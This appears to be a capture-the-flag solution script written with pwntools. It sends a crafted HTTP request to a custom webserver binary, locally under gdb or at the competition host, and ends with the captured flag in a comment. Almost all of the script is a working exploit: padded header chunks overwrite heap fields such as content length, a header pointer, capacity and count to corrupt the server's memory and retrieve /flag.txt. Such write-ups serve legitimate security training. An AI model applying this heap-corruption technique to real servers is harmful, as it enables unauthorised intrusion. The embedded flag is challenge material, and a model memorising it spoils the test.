from pwn import *
from sys import argv

context.log_level = 'debug'

def header_chunk(padding:bytes, content_length:int, headers:int, header_cap:int, header_count:int):
    '''to realloc: header_count + 1 > header_cap, size = 0x10 * (header_cap < 4 ? 4 : header_cap * 2)
    '''
    if isinstance(padding, str):
        padding = padding.encode()

    return padding.ljust(0x358 - 0x3c, b'A') + p32(content_length) + \
            p64(headers) + p32(header_cap) + p32(header_count) + b'\n'


first_line = f'''GET /flag.txt HTTP/1.1\n'''

# leaker_header = lambda offset: "A"*(0x358 - 0x158 + 0x8 * offset - 1) + '\n'

# 1/16 of good heap address
body = first_line.encode() + \
    header_chunk(f'{"A" * 0x57}:1\0', 0, 0x4050e0, 0xffffff, 0) + \
    header_chunk(f'{"A" * 0x57}:1\0', 0, 0x4050e0, 0xffffff, 0) + \
    header_chunk(f'{"B" * 0x107}:1\0', 0, 0x4050e1, 0xffffff, 0) + \
    header_chunk(f'{"C" * 0x97}:1\0', 0, 0x4050e2, 0xffffff, 0) + \
    header_chunk(f'{"D" * 0xd7}:1\0', 0, 0x4050e3, 0xffffff, 0) + \
    header_chunk(f'{"D" * 0xd7}:1\0', 0, 0x4050e4, 0xffffff, 0) + \
    header_chunk(f'{"D" * 0xd7}:1\0', 0, 0x4050e5, 0xffffff, 0) + \
    header_chunk(f'{"D" * 0xd7}:1\0', 0, 0x4050e6, 0xffffff, 0) + \
    header_chunk(f'{"D" * 0xd7}:1\0', 0, 0x4050e7, 0xffffff, 0) + \
    b'\n'


conn = remote('guppy.utctf.live', 5848) if 'r' in argv else None
if 'r' not in argv:
    context.terminal = ['tmux', 'splitw', '-h', '-l', '80%']
#     # gdb.attach(pidof(conn)[0], 'b *0x402114')
    conn:process = gdb.debug(['./webserver'], '''
                    #  b *0x40239d
                    #  b *0x40228a
                     b *0x402485
                     ''', exe = './webserver' )

conn.send(body)
conn.shutdown()
msg = conn.recvall()
print(msg)

while True:
    sleep(5)
# conn.interactive()
    
# utflag{an_educational_experience}